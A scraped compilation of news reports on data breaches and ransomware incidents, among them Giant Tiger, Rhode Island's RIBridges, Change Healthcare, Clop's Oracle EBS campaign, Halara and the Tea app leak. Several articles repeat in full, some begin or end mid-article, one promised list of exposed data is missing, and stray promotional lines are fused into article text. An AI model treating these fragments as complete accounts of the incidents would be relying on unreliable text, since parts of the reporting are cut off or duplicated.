Atlassian confirmed to BleepingComputer today that the information was collected through a Trello REST API that was secured in January. ""Enabled by the Trello REST API, Trello users have been enabled to invite members or guests to their public boards by email address. However, given the misuse of the API uncovered in this January 2024 investigation, we made a change to it so that unauthenticated users/services cannot request another user's public information by email.

In 2022, Twitter suffered a similar breach when threat actors abused an unsecured API to link phone numbers and email addresses to millions of users. As many people post anonymously on social media, this data allowed for the unmasking of these people, posing a significant privacy risk. More recently, an unsecured Twilio API was used to confirm the phone numbers of 33 million Authy multi-factor authentication app users.

A threat actor has now publicly claimed responsibility for the data breach and leaked 2.8 million records on a hacker forum that they claim are of Giant Tiger customers. Data breach monitoring service HaveIBeenPwned has added the leaked database to its website to make it easy for users to check if their information was compromised. The discount store chain operates over 260 stores and employs 8,000 people across Canada. On Friday, BleepingComputer noticed a post titled ""Giant Tiger Database - Leaked, Download!"" surfacing on a hacker forum. The threat actor behind the post claims to have uploaded the ""full"" database of Giant Tiger customer records stolen in March 2024. ""In March 2024, the Canadian discount store chain Giant Tiger Stores Limited... suffered a data breach that exposed over 2.8 million clients,"" states the threat actor. ""The breach includes over 2.8 million unique email addresses, names, phone numbers and physical addresses."" The stolen data in the dump, claims the threat actor, additionally includes the ""website activity"" of Giant Tiger customers. ""I finally opened 60 of the 60 pages of the database section!"" replied one forum member to the post, with others requesting to preview a sample of the data set. The threat actor obliged and posted a small snippet. The data set has been leaked essentially for free. Although the download link to the set has to be unlocked by spending ""8 credits,"" such credits are typically trivially generated by forum members by, for example, commenting on existing posts or contributing new posts. Threat actors often breach companies and steal sensitive data to blackmail them and extort money. Failing successful extortion, a threat actor may deliberately leak the stolen data online or sell it off on dark web marketplaces to buyers interested in conducting identity theft and phishing attacks.

A threat actor has now publicly claimed responsibility for the data breach and leaked 2.8 million records on a hacker forum that they claim are of Giant Tiger customers. Data breach monitoring service HaveIBeenPwned has added the leaked database to its website to make it easy for users to check if their information was compromised. The discount store chain operates over 260 stores and employs 8,000 people across Canada. On Friday, BleepingComputer noticed a post titled ""Giant Tiger Database - Leaked, Download!"" surfacing on a hacker forum. The threat actor behind the post claims to have uploaded the ""full"" database of Giant Tiger customer records stolen in March 2024. ""In March 2024, the Canadian discount store chain Giant Tiger Stores Limited... suffered a data breach that exposed over 2.8 million clients,"" states the threat actor. ""The breach includes over 2.8 million unique email addresses, names, phone numbers and physical addresses."" The stolen data in the dump, claims the threat actor, additionally includes the ""website activity"" of Giant Tiger customers. ""I finally opened 60 of the 60 pages of the database section!"" replied one forum member to the post, with others requesting to preview a sample of the data set. The threat actor obliged and posted a small snippet. The data set has been leaked essentially for free. Although the download link to the set has to be unlocked by spending ""8 credits,"" such credits are typically trivially generated by forum members by, for example, commenting on existing posts or contributing new posts. Threat actors often breach companies and steal sensitive data to blackmail them and extort money.

Ransomware gang leaks data stolen in Rhode Island's RIBridges Breach,https://www.bleepingcomputer.com/news/security/ransomware-gang-leaks-data-stolen-in-rhode-islands-ribridges-breach/#comment_form,Lawrence Abrams,"January 2, 2025","The Brain Cipher ransomware gang has begun to leak documents stolen in an attack on Rhode Island's ""RIBridges"" social services platform. RIBridges is an integrated eligibility system (IES) used by the state to manage and deliver social assistance programs, including healthcare, food assistance, child care, and other services. Rhode Island first learned that RIBridges was the target of an attack on December 5 after being notified by its vendor, Deloitte. However, it wasn't until December 10 that it was confirmed that threat actors gained access to the system and likely stole data. ""On December 10, the State received confirmation from Deloitte that there had been a breach of the RIBridges system based on a screenshot of file folders sent by the hacker to Deloitte,"" reads a statement from the government. ""On December 13, Deloitte confirmed there was malicious code present in the system, and the State directed Deloitte to shut RIBridges down to remediate the threat."" continued the statement. Last week, the Brain Cipher ransomware gang began leaking some of the stolen data on its data leak site. Cybersecurity researcher Connor Goodwolf downloaded the data and claims it contains the personal data of both adults and minors. ""The ransomware group Brain Cipher has released the breach data from the Deloitte RIBridges hack, containing PII of not just adults but minors,"" tweeted the researcher . Based on screenshots shared by GoodWolf, the stolen files consist of numerous archives containing what appear to be Oracle databases, backups, and other data. Cybersecurity news site DataBreaches.net also confirmed that the data contained the personal information of Rhode Island residents. Goodwolf was previously sued by the City of Columbus for sharing samples of data stolen from the City's IT network and leaked by the Rhysida ransomware gang. That lawsuit has since been dismissed. In a statement released earlier this week, Governor McKee confirmed that some data was released on the dark web. ""Deloitte informed us that the cybercriminal released some RIBridges files on the dark web. While IT teams are working diligently to analyze the files, the most important thing Rhode Islanders can do is protect their personal information now,"" tweeted McKee. It is believed that approximately 650,000 people were impacted by the breach and may have had their names, addresses, dates of birth, Social Security numbers, and certain banking information exposed in the attack. Due to this data's sensitive nature, state officials advise Rhode Islanders to freeze and monitor their credit for fraudulent activity. It is also advised to be on the lookout for targeted phishing scams utilizing the stolen data that may attempt to steal further information. Brain Cipher is a ransomware gang that began conducting attacks in June 2024, with the group gaining media attention after it attacked Indonesia's temporary National Data Center. The ransomware gang utilizes an encryptor created using the leaked LockBit 3.0 builder and uses a data leak site to extort victims into paying a ransom demand. At this time, the Brain Cipher data leak site is offline and the leaked data is not accessible. However, their Tor negotiation page continues to work, potentially indicating that the data leak site is under a DDoS attack to prevent the dissemination of stolen data. It's budget season!

DraftKings warns of account breaches in credential stuffing attacks,https://www.bleepingcomputer.com/news/security/draftkings-warns-of-account-breaches-in-credential-stuffing-attacks/,Sergiu Gatlan,"October 7, 2025","Sports betting giant DraftKings has notified an undisclosed number of customers that their accounts had been hacked in a recent wave of credential stuffing attacks. DraftKings, a gambling company based in Boston and founded in 2012, provides sportsbook and daily fantasy sports (DFS) services and is an official partner of the NFL, NHL, PGA TOUR, WNBA, UFC, and NASCAR. DraftKings employs over 5,100 people and reported revenues of $4.77 billion at the end of 2024. In data breach notification letters sent on Thursday, October 2, DraftKings informed affected customers that attackers had gained access to their accounts and a ""limited amount"" of their data in attacks that bore all the signs of a credential stuffing campaign. Credential stuffing involves attackers using automated tools to breach user accounts with stolen username/password pairs from other online services, a tactic that is especially effective against those who reuse credentials across multiple platforms. The threat actors aim to take over accounts to steal personal and financial information, which can later be sold on the dark web or used for identity theft and other malicious purposes. However, the company said the attackers didn't access sensitive data like ""government-issued identification numbers, full financial account numbers,"" or other information that would've enabled them to breach customers' bank accounts or commit identity theft. ""By stealing login credentials from a non-DraftKings source and using them in this attack, however, the bad actor may have temporarily been able to log into certain DraftKings customers' accounts,"" DraftKings said . ""In the event your account was accessed, the attacker may have been able to view your name, address, date of birth, phone number, email address, last four digits of a payment card, profile photo, information about prior transactions, account balance, and date your password was last changed."" In response to these attacks, the company will require potentially affected customers to reset their DraftKings account passwords and enable multifactor authentication for logins to DK Horse accounts. DraftKings also advised customers to change their account passwords, review their bank accounts and credit reports, place security freezes on their credit reports, and set up fraud alerts on their credit files as a precaution. A DraftKings spokesperson was not immediately available for comment when contacted by BleepingComputer earlier today. DraftKings also revealed in November 2022 that up to $300,000 was stolen from accounts breached in another credential stuffing campaign. One month later, the sports betting company refunded hundreds of thousands of dollars to 67,995 customers whose accounts had been hacked in the incident. The FBI has warned for years that credential stuffing attacks are a massively increasing threat due to readily available aggregated lists of leaked credentials and automated tools. Update 10/7/25: After publishing the story, DraftKings told BleepingComputer that the credential stuffing attacks impacted less than 30 customers. ""DraftKings reported a potential security incident involving suspicious logins to the accounts of less than 30 customers,"" a DraftKings spokesperson told BleepingComputer. ""Our investigation to date has observed no evidence that the login credentials used were obtained from DraftKings or that DraftKings’ computer systems or networks were breached.

Since then, it has expanded to 59 product engineering centers and several offices worldwide. In a breach notification letter filed with the office of Maine's Attorney General , the company states that the attackers exploited an Oracle EBS zero-day vulnerability to steal personal information belonging to 10,471 employees. ""GlobalLogic's investigation identified access to Oracle and exfiltration on October 9, 2025. We then began drafting and sending out notifications. The investigation has identified the earliest date of threat actor activity as July 10, 2025, with the most recent activity occurring on August 20, 2025,"" it said. ""This incident did not target or impact GlobalLogic's systems outside our Oracle platform, and, based on industry reports, we are one of many Oracle customers believed to have been impacted. The personal information involved in this incident was from our Oracle platform, which includes HR information for current and former personnel."" The data stolen in the breach includes personal information collected by GlobalLogic's human resources and, depending on the affected individual, it includes name, address, phone number, and emergency contact (name and phone number). The attackers also exfiltrated the email addresses, dates of birth, nationalities, countries of birth, passport information, national identifiers or tax identifiers (e.g., Social Security Numbers), salary information, and bank account details of impacted employees. While GlobalLogic has yet to attribute the breach to a specific threat group, the incident's details align with an extortion campaign in which the Clop ransomware gang exploited a zero-day flaw (CVE-2025-61882) since early August to steal sensitive data from many companies' Oracle EBS systems. Although Clop has yet to disclose the total number of companies affected by these data theft attacks, Google Threat Intelligence Group chief analyst John Hultquist has told BleepingComputer that they believe dozens of organizations were impacted. The extortion gang is now also targeting Harvard University , Envoy Air , and The Washington Post , who have all been added to the cybercrime group's Tor leak site. Their data has also been leaked online and is now available for download via Torrent. Clop has yet to add GlobalLogic to its leak site, which suggests that the company is still negotiating with the threat group or has already paid a ransom. A GlobalLogic spokesperson didn't respond to questions regarding Clop's demands, but confirmed the cybercrime gang ""is taking credit for the incident."" Clop has been previously linked to other data theft campaigns targeting Accellion FTA , GoAnywhere MFT , Cleo , and MOVEit Transfer , the latter of which has impacted over 2,770 organizations worldwide.

Sony confirms data breach impacting thousands in the U.S.,https://www.bleepingcomputer.com/news/security/sony-confirms-data-breach-impacting-thousands-in-the-us/,Bill Toulas,"October 4, 2023","Sony Interactive Entertainment (Sony) has notified current and former employees and their family members about a cybersecurity breach that exposed personal information. The company sent the data breach notification to about 6,800 individuals, confirming that the intrusion occurred after an unauthorized party exploited a zero-day vulnerability in the MOVEit Transfer platform. The zero-day is CVE-2023-34362 , a critical-severity SQL injection flaw that leads to remote code execution, leveraged by the Clop ransomware in large-scale attacks that compromised numerous organizations across the world. Clop ransomware gang added Sony Group to its list of victims in late June. However, the firm did not provide a public statement until now. According to the data breach notification, the compromise happened on May 28, three days before Sony learned from Progress Software (the MOVEit vendor) about the flaw, but it was discovered in early June. “On June 2, 2023, [we] discovered the unauthorized downloads, immediately took the platform offline, and remediated the vulnerability,” reads the notice . “An investigation was then launched with assistance from external cybersecurity experts. We also notified law enforcement,” Sony says in the data breach notification. Sony says the incident was limited to the particular software platform and had no impact on any of its other systems. Still, sensitive information belonging to 6,791 people in the U.S . was compromised. The firm has individually determined the exposed details and listed them in each individual letter, but it is censored in the notification sample submitted to the Office of the Maine Attorney General. The notification recipients are now offered credit monitoring and identity restoration services through Equifax, which they can access by using their unique code until February 29, 2024. Late last month, following allegations on hacking forums that Sony had been breached again and 3.14 GB of data had been stolen from the company’s systems, the firm responded by saying it was investigating the claims. The leaked dataset that at least two separate threat actors held , contained details for the SonarQube platform, certificates, Creators Cloud, incident response policies, a device emulator for generating licenses, and more. A Sony spokesperson shared with BleepingComputer the statement below, which confirms a limited security breach: Sony has been investigating recent public claims of a security incident at Sony. We are working with third-party forensics experts and have identified activity on a single server located in Japan used for internal testing for the Entertainment, Technology and Services (ET&S) business. Sony has taken this server offline while the investigation is ongoing. There is currently no indication that customer or business partner data was stored on the affected server or that any other Sony systems were affected. There has been no adverse impact on Sony's operations. This confirms that Sony has suffered two security breaches in the past four months. It's budget season!

In December 2021 , it acquired Bluetooth tracking service provider Tile in a $205 million deal.

The threat actors leaked data samples allegedly stolen from Anna Jaques on their dark web extortion site, threatening to expose sensitive patient information if their demands weren't met. Subsequent updates on the Money Message page showed that the hospital's administrators didn't engage with the threat actors, and the situation culminated with the release of all data on January 26. Anna Jaques states that the forensic investigation into what the threat actors had stolen was thorough and lengthy, involving manual document review, so it was only completed on November 5, 2024. According to the related entry on the Office of the Maine Attorney General, where Anna Jaques posted a sample of the notification it sent to affected individuals yesterday, the incident has impacted 316,342 patients .

The threat actors leaked data samples allegedly stolen from Anna Jaques on their dark web extortion site, threatening to expose sensitive patient information if their demands weren't met. Subsequent updates on the Money Message page showed that the hospital's administrators didn't engage with the threat actors, and the situation culminated with the release of all data on January 26. Anna Jaques states that the forensic investigation into what the threat actors had stolen was thorough and lengthy, involving manual document review, so it was only completed on November 5, 2024. According to the related entry on the Office of the Maine Attorney General, where Anna Jaques posted a sample of the notification it sent to affected individuals yesterday, the incident has impacted 316,342 patients . According to its results, the following information has been exposed: ""Anna Jaques has no indication that there has been any fraud as a result of this incident,"" reads the announcement . ""However, out of an abundance of caution, commencing on December 5, 2024, Anna Jaques notified individuals whose information may have been impacted as a result of the incident to the extent Anna Jaques had their address."" ""Additionally, Anna Jaques reminds its employees and patients to remain vigilant in reviewing financial account statements on a regular basis for any fraudulent activity."" Those impacted are offered 24-month-long identity protection and credit monitoring services through Experian and 1B and are urged to consider placing a fraud alert or security freeze on their credit file.

Affirm is a fintech firm that provides consumer-friendly alternatives to traditional credit options. It also offers point-of-sale financing, virtual cards on a mobile app , and a fully integrated physical card called the 'Affirm Card.' Evolve is a large financial services provider specializing in retail and commercial banking, payment processing, and banking-as-a-service (BaaS). It has active partnerships with multiple fintech companies, including Shopify, Bilt, Plaid, Stripe, and Mercury. These fintech companies use it to provide the banking backend for their products, including issuing cards, managing deposits, and facilitating loans. In June, the LockBit ransomware gang falsely claimed to have breached the US Federal Reserve and stolen 33 TB of data. However, after researchers analyzed the data, it was determined that it had been stolen from Evolve Bank & Trust, which confirmed to BleepingComputer that the data belonged to them. ""Evolve is currently investigating a cybersecurity incident involving a known cybercriminal organization. It appears these bad actors have released illegally obtained data, on the dark web,"" an Evolve Spokesperson told BleepingComputer. In an update published yesterday , Evolve said it has responded to the incident by resetting passwords globally, reconstructing critical Identity Access Management components, including Active Directory, and various network hardening measures. As of the latest investigation findings, there's evidence that the stolen data includes names, Social Security Numbers (SSNs), bank account numbers, and contact information. Affirm, one of Evolve's clients, is now warning its customers that their personal and financial information might have been exposed in the Evolve data breach. Affirm shares customer data with Evolve as required to issue Affirm Cards, a debit card that lets you pay for purchases over time. ""On June 25, 2024, Evolve Bank & Trust (""Evolve""), the third-party issuer of the Affirm Card, notified Affirm (the Company) that Evolve had experienced a cybersecurity incident whereby a third party gained unauthorized access to personal information and financial information (""Personal Information"") of Evolve retail banking customers and the customers of its financial technology partners,"" reads the 8-K filing . ""Because the Company shares the Personal Information of Affirm Card users with Evolve to facilitate the issuance and servicing of Affirm Cards, the Company believes that the Personal Information of Affirm Card users was compromised as part of Evolve's cybersecurity incident."" Affirm added that Evolve had assured them the cybersecurity incident had been contained. However, an investigation into the scope of the breach and the extent of the unauthorized access is still ongoing. Meanwhile, Affirm says users may continue to transact normally as the Company remains on high alert for potentially suspicious activity linked to the incident. The breach at Evolve has potentially affected several other fintech firms in the US, with Wise and Bilt confirming they were impacted. Wise published a statement on its website late last week, informing customers it had shared full names, addresses, contact details, Social Security numbers, and other sensitive information with Evolve as part of a partnership between 2020 and 2023. Wise assured customers that their accounts remain secure and it's safe to continue using their 'Wise Cards' but recommended heightened vigilance against potential phishing attacks. Bilt has also notified customers via notifications that its partnership with Evolve may have led to the compromise of sensitive customer information. However, a Bilt employee confirmed on Reddit that they are unsure if any of its customers' data was actually exposed. ""We provided this notice out of an abundance of caution, but at this time Evolve has not indicated what, if any, Bilt user information has been impacted,"" a Bilt employee posted on Reddit . Similarly to the other entities, Bilt reassured users that their accounts remain secure and that the platform wasn't directly impacted; hence, there's no disruption to its operations. Evolve has also promised to email individual notifications to all persons confirmed to have been impacted by the incident on July 8, 2024.

In October, UnitedHealth reported to the US Department of Health and Human Services Office for Civil Rights that the attack affected 100 million people . However, as first reported by TechCrunch, UnitedHealth confirmed on Friday that the figure has nearly doubled to 190 million. ""Change Healthcare has determined the estimated total number of individuals impacted by the Change Healthcare cyberattack is approximately 190 million,"" UnitedHealth Group told TechCrunch . ""The vast majority of those people have already been provided individual or substitute notice. The final number will be confirmed and filed with the Office for Civil Rights at a later date."" While UnitedHealth says that there are no indications that the threat actors have misused the stolen data, the sheer quantity of sensitive information stolen in the attack is massive. This stolen data includes patients' health insurance information, medical records, billing and payment information, and sensitive personal information, such as phone numbers, addresses, and, in some cases, Social Security Numbers and government ID numbers. The ransomware attack on UnitedHealth's subsidiary, Change Healthcare, is the largest healthcare data breach in US history. In February 2024, UnitedHealth subsidiary Change Healthcare suffered a massive ransomware attack , leading to widespread disruption to the United States healthcare system. This disruption prevented doctors and pharmacies from filing claims and pharmacies from accepting discount prescription cards, causing patients to pay full price for medications. It was later learned that the BlackCat ransomware gang , aka ALPHV, was behind the attack. The threat actors used stolen credentials to breach the company's Citrix remote access service, which did not have multi-factor authentication enabled. After breaching the network, the threat actors stole 6 TB of data and encrypted computers, causing the company to shut down IT systems and its online platforms for billing, claims, and prescription fulfillment. The UnitedHealth Group later confirmed it paid a ransom to receive a decryptor and to prevent the threat actors from publicly releasing the stolen data. This ransom payment was allegedly $22 million, according to the BlackCat ransomware affiliate who conducted the attack. This ransom payment was supposed to be split between the affiliate and the ransomware operators, but the BlackCat suddenly shut down in an exit scam, stealing the entire payment for themselves. This is where it got worse for UnitedHealth, as the threat actor behind the attack stated that they did not delete the stolen data as promised. The attacker then partnered with a new ransomware operation named RansomHub and began leaking some of the stolen data , demanding an additional payment for the data not to be released. A few days later, the Change Healthcare entry on RansomHub's data leak site mysteriously disappeared, indicating that United Health likely paid a second ransom demand. UnitedHealth said in April that the Change Healthcare ransomware attack caused $872 million in losses , which increased as part of the Q3 2024 earnings to an expected $2.45 billion for the nine months to September 30, 2024, As MCP (Model Context Protocol) becomes the standard for connecting LLMs to tools and data, security teams are moving fast to keep these new services safe.

"Halara probes breach after hacker leaks data for 950,000 people",https://www.bleepingcomputer.com/news/security/halara-probes-breach-after-hacker-leaks-data-for-950-000-people/,Lawrence Abrams,"January 11, 2024","Popular athleisure clothing brand Halara is investigating a data breach after the alleged data of almost 950,000 customers was leaked on a hacking forum. The Hong Kong company was founded in 2020 and quickly became very popular through the many videos promoting its clothing on TikTok. Halara told BleepingComputer that it is aware that customer data was allegedly stolen and leaked online and is investigating a potential breach. This comes after a person named 'Sanggiero' claimed to have breached Halara earlier this month and shared a text file containing stolen customer data on a hacking forum and a Telegram channel. ""In January 2024, over 1M rows of data from the store company Halara was posted to a popular hacking forum. The data contained 1M unique addressId, first name, last name, phone numbers, country, home address, zip, province, city, iso,"" reads a post from Sanggiero. It should be noted that the forum post uses an incorrect logo for Halara and instead uses one for a cannabis company that was not breached. BleepingComputer has reviewed the leaked data, and while Sanggiero says it contains 1 million lines of data, the text file only contains 941,910 records. While BleepingComputer has not been able to confirm if all of the data is accurate, we contacted multiple people listed in the file and have confirmed that they are all Halara customers and that their listed phone numbers, names, and addresses are accurate. In a conversation with BleepingComputer, Sanggiero says that they obtained the data by exploiting a bug in an API on Halara's website, which they say is still unfixed. Sanggiero said they did not contact Halara about the stolen data and decided to release it for free as it would not have a lot of value if trying to sell it. Halara customers should be on the lookout for targeted smishing attacks (SMS phishing) that attempt to steal other information, such as email addresses and passwords. This information can be used for further attacks or sold to other threat actors who use it for fraud or other malicious behavior. BleepingComputer is aware of numerous threat actors selling stolen accounts for online retailers, such as Saks 5th Avenue, Express, and Ulta Beauty, which are used to make fraudulent purchases.

"Halara probes breach after hacker leaks data for 950,000 people",https://www.bleepingcomputer.com/news/security/halara-probes-breach-after-hacker-leaks-data-for-950-000-people/#comment_form,Lawrence Abrams,"January 11, 2024","Popular athleisure clothing brand Halara is investigating a data breach after the alleged data of almost 950,000 customers was leaked on a hacking forum. The Hong Kong company was founded in 2020 and quickly became very popular through the many videos promoting its clothing on TikTok. Halara told BleepingComputer that it is aware that customer data was allegedly stolen and leaked online and is investigating a potential breach. This comes after a person named 'Sanggiero' claimed to have breached Halara earlier this month and shared a text file containing stolen customer data on a hacking forum and a Telegram channel. ""In January 2024, over 1M rows of data from the store company Halara was posted to a popular hacking forum. The data contained 1M unique addressId, first name, last name, phone numbers, country, home address, zip, province, city, iso,"" reads a post from Sanggiero. It should be noted that the forum post uses an incorrect logo for Halara and instead uses one for a cannabis company that was not breached. BleepingComputer has reviewed the leaked data, and while Sanggiero says it contains 1 million lines of data, the text file only contains 941,910 records. While BleepingComputer has not been able to confirm if all of the data is accurate, we contacted multiple people listed in the file and have confirmed that they are all Halara customers and that their listed phone numbers, names, and addresses are accurate. In a conversation with BleepingComputer, Sanggiero says that they obtained the data by exploiting a bug in an API on Halara's website, which they say is still unfixed. Sanggiero said they did not contact Halara about the stolen data and decided to release it for free as it would not have a lot of value if trying to sell it. Halara customers should be on the lookout for targeted smishing attacks (SMS phishing) that attempt to steal other information, such as email addresses and passwords. This information can be used for further attacks or sold to other threat actors who use it for fraud or other malicious behavior. BleepingComputer is aware of numerous threat actors selling stolen accounts for online retailers, such as Saks 5th Avenue, Express, and Ulta Beauty, which are used to make fraudulent purchases.

FinWise partners with American First Finance by serving as the bank that originates and funds these loans. According to a filing with the Maine Attorney General's office , American First Finance disclosed that the FinWise Bank data breach impacted the data of 689,000 of its customers. The filing included a notification letter prepared by FinWise on behalf of American First Finance, confirming that the bank itself was the source of the incident. FinWise said that files containing customer information, including full names and other personal data elements, were accessed during the breach, but redacted the complete list of exposed data breach notification. The company did not disclose how the ex-employee was able to access this data after they were no longer employed or the total number of people impacted by the FinWise breach. Upon discovery, the bank launched an investigation with outside cybersecurity professionals to assess the scope of the exposure. FinWise says it has strengthened internal controls to reduce the risk of similar incidents and is offering 12 months of free credit monitoring and identity theft protection services to those impacted. BleepingComputer contacted FinWise Bank to learn more about the breach, but a FinWise spokesperson said they do not comment on ongoing litigation.

The investigation is ongoing and the police decided not to reveal publicly who is responsible or how they carried out the attack until all the details have been collected and analyzed.

Politie says it has implemented stronger security measures to counter the attack, and added that they know exactly who is behind it, but don’t want to give away too much information at this point.

Additionally, all systems are being continuously monitored for any signs of abnormal activity, and the IT staff is on high alert to take immediate action. Although Politie did not specify how many people are impacted by this incident, a letter to the Dutch House of Representatives sent by David van Weel, Minister of Justice and Security in the Netherlands, informs that “work-related contact details of all police officers have been stolen.” Politie says that additional information will become public as soon as it is possible, as the details may affect the current investigation.

""In April 2023 T-Mobile suffered a data breach exposing sales data/ analytics, T-Mobile support calls with customers, employee credentials, partial SSNs, email addresses and customer data,"" reads the forum post. The archive posted to the hacking forum contains a large amount of data, including employee IDs, employment status, hire dates, termination dates, rehire dates, job titles, department, names, last four digits of social security number, and email addresses. The data also appears to contain information about customer orders and their plans. Malware repository VX-Underground was first to share info on the data leak in tweets [ 1 , 2 ] describing it as being the result of a T-Mobile breach. ""T-Mobile has been breached (again). Data has been exfiltrated and it is being shared online (again) This is T-Mobile's 8th breach since 2018,"" reads tweets from VX-Underground. As T-Mobile is known in the cybersecurity community for its repeated data breaches, suffering nine since 2018 , with two already in 2023, it was easy to assume that it suffered another. However, this data breach is believed to be related to Amtel, LLC, an authorized T-Mobile retailer doing business as the Connectivity Source brand, who warned of a breach earlier this year. In May 2023, Amtel warned that they suffered a data breach on April 19th that allowed the attackers to steal data for current or former employees of the company. ""On April 19, 2023, Amtel was notified of suspicious activity in its network environment. Upon discovery of this incident, Amtel promptly engaged a specialized cybersecurity firm to secure its environment and to determine the nature and scope of the incident,"" reads the Amtel/Connectivity Source data breach notification . ""While the investigation is ongoing, Amtel determined the incident involved limited personally identifiable information (""PII"") the same day."" While it has not been confirmed if the data released on BreachForums is the same data breach disclosed by Amtel, the dates align, making it highly likely. BleepingComputer contacted Connectivity Source about the publishing of its stolen data last night but did not receive a response to our email. The good news is that this data does not contain customer data, and Amtel claims that only 17,835 current and former employees were impacted by the breach. However, this data is still valuable for threat actors, who could send targeted phishing emails to Connectivity Source employees to gain access to support systems or perform SIM Swapping attacks. Therefore, all Connectivity Source employees should be on the lookout for suspicious emails and confirm that they are legitimate before acting upon any of them.

While the lower house of the Parliament of Canada has yet to issue a public statement regarding this incident, CBC News reports that House of Commons staff were notified of a breach on Monday via email. The alert states that the attacker exploited a recent Microsoft vulnerability to gain access to a database containing sensitive information used to manage House of Commons computers and mobile devices. During the breach, the threat actor also stole some employee data that isn't publicly available, including their names, job titles, office locations, and email addresses. Employees and House of Commons members were also urged to be aware of potential fraudulent attempts to use the information stolen during the attack, which could be used to target and impersonate parliamentarians or exploited in scams. The Canadian Centre for Cyber Security (Cyber Centre), a part of the country's Communications Security Establishment (CSE), told BleepingComputer that it's supporting the House of Commons' ongoing investigation but didn't link the attack to a particular threat group. ""However, we can tell you that we are aware of the incident and working with the House of Commons to provide support,"" said the Cyber Centre. ""Attribution of a cyber incident is difficult.

BHCP is a network of over 300 pediatric physicians and specialists operating over 60 locations across New York's Hudson Valley and Connecticut, offering patient care in clinics, community hospitals, and health centers affiliated with Boston Children's Hospital. According to the announcement BHCP published on its website , a cyberattack compromised its IT vendor on September 6 and a few days later BHCP detected unauthorized activity on its network. The investigation that followed, conducted with the help of a third-party forensic expert, confirmed that the threat actors had gained unauthorized access to BHCP systems and also exfiltrated files. The exposure impacts current and former employees, patients, and guarantors. The exposed data includes the following, depending on the information customers provided to BHCP: BHCP clarifies that the cyberattack did not impact its electronic medical record systems, as they are hosted on a separate network. Individuals confirmed to have been affected by the incident will receive a letter from BHCP by October 25. Those who had their SSN and driver's license exposed will also receive credit monitoring and protection services. Earlier this week, the BianLian ransomware group claimed the attack by ading BHCP to their extortion portal. The threat actors claim to have finance and HR data, email correspondence, database dumps, personally identifiable and health records, health insurance records, and data related to children. The threat actors have not leaked anything yet, and there is no deadline for exposing the stolen information, indicating that they still expect to negotiate with BHCP. Attacking children healthcare organizations and stealing the data of minors is typically avoided by ransomware groups, or at least they claim so, but some threat actors lack the moral guidelines to draw the line at that.

Tea app leak worsens with second database exposing user chats,https://www.bleepingcomputer.com/news/security/tea-app-leak-worsens-with-second-database-exposing-user-chats/#comments,Lawrence Abrams,"July 28, 2025","The Tea app data breach has grown into an even larger leak, with the stolen data now shared on hacking forums and a second database discovered that allegedly contains 1.1 million private messages exchanged between the app's members. The Tea app is a women-only dating safety platform where members can share reviews about men, with access to the platform only granted after providing a selfie and government ID verification. On Friday, an anonymous user posted on 4chan that Tea used an unsecured Firebase storage bucket to store drivers' licenses and selfies uploaded by members to verify they are women, as well as photos and images shared in comments. The user shared a Python script that could be used to download the data from the now-secured storage bucket. In total, over 59 GB of data was exposed in the leak, with Tea confirming in a public statement that it affects users who signed up before 2024. ""A legacy data storage system was compromised, resulting in unauthorized access to a dataset from prior to February 2024,"" reads a security breach announcement . ""This dataset includes approximately 72,000 images, including approximately 13,000 selfies and photo identification submitted by users during account verification and approximately 59,000 images publicly viewable in the app from posts, comments and direct messages."" The platform states that selfies were not deleted as expected to comply with law enforcement requirements related to cyber-bullying prevention. Threat actors have now begun sharing torrents of the leaked data on hacking forums, potentially exposing the app's members to social engineering attacks. BleepingComputer has confirmed that the shared data contains driver's licenses, selfies, and message attachments. To make matters worse, 404 Media now reports that an additional database was found containing 1.1 million private messages sent between users on the Tea platform. This database contains much more recent data, ranging from 2023 to last week, and reportedly includes messages discussing sensitive topics, such as those about abortions, cheating husbands, and two-timing boyfriends. Kasra Rahjerdi, the researcher who discovered the new database, told 404 Media that any Tea user could access the stored user data using their own API key. According to 404 Media, it's possible to identify users based on social media profiles, phone numbers, or other personal details revealed in the messages. What was meant to be a safe space for women has now become a tool to embarrass them, with someone even creating a “facesmash”-style site where visitors can rate the selfies exposed in the leaked data. Tea says they continue to work with third-party cybersecurity experts to contain the incident and conduct an investigation into the attack.

Tea app leak worsens with second database exposing user chats,https://www.bleepingcomputer.com/news/security/tea-app-leak-worsens-with-second-database-exposing-user-chats/,Lawrence Abrams,"July 28, 2025","The Tea app data breach has grown into an even larger leak, with the stolen data now shared on hacking forums and a second database discovered that allegedly contains 1.1 million private messages exchanged between the app's members. The Tea app is a women-only dating safety platform where members can share reviews about men, with access to the platform only granted after providing a selfie and government ID verification. On Friday, an anonymous user posted on 4chan that Tea used an unsecured Firebase storage bucket to store drivers' licenses and selfies uploaded by members to verify they are women, as well as photos and images shared in comments. The user shared a Python script that could be used to download the data from the now-secured storage bucket. In total, over 59 GB of data was exposed in the leak, with Tea confirming in a public statement that it affects users who signed up before 2024. ""A legacy data storage system was compromised, resulting in unauthorized access to a dataset from prior to February 2024,"" reads a security breach announcement . ""This dataset includes approximately 72,000 images, including approximately 13,000 selfies and photo identification submitted by users during account verification and approximately 59,000 images publicly viewable in the app from posts, comments and direct messages."" The platform states that selfies were not deleted as expected to comply with law enforcement requirements related to cyber-bullying prevention. Threat actors have now begun sharing torrents of the leaked data on hacking forums, potentially exposing the app's members to social engineering attacks. BleepingComputer has confirmed that the shared data contains driver's licenses, selfies, and message attachments. To make matters worse, 404 Media now reports that an additional database was found containing 1.1 million private messages sent between users on the Tea platform. This database contains much more recent data, ranging from 2023 to last week, and reportedly includes messages discussing sensitive topics, such as those about abortions, cheating husbands, and two-timing boyfriends. Kasra Rahjerdi, the researcher who discovered the new database, told 404 Media that any Tea user could access the stored user data using their own API key. According to 404 Media, it's possible to identify users based on social media profiles, phone numbers, or other personal details revealed in the messages. What was meant to be a safe space for women has now become a tool to embarrass them, with someone even creating a “facesmash”-style site where visitors can rate the selfies exposed in the leaked data. Tea says they continue to work with third-party cybersecurity experts to contain the incident and conduct an investigation into the attack. The app says that it also notified law enforcement, who are assisting with the investigation. Update 7/28/25 11:41 PM ET: Tea shared the following statement with BleepingComputer in response to our questions about the additional data leak.

